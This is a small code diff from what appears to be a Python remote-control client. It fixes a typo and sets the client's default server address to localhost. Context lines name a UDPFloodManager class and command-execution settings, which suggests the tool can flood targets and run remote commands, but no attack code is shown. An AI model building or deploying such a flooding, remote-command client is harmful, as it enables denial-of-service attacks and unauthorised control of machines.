@@ -21,7 +21,7 @@ if os.name == "nt":
 else:
 	ENCODING = "utf-8"
 
-AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
+AUTHORIZATION = "" # (optional) Set this to the authorization token you want to use
 MAX_CHUNK_SIZE = 16 * 1024 # 16KB
 POPEN_TIMEOUT = 60 # seconds
 
@@ -228,7 +228,7 @@ class UDPFloodManager(Thread):
 
 
 class Client():
-	def __init__(self, addr:Tuple[str,int]=("PUT YOUR IP ADRESS HERE",8080)) -> None:
+	def __init__(self, addr:Tuple[str,int]=("127.0.0.1",8080)) -> None:
 		signal.signal(signal.SIGINT, self.exit_gracefully)
 		signal.signal(signal.SIGTERM, self.exit_gracefully)
 		self.stop = False
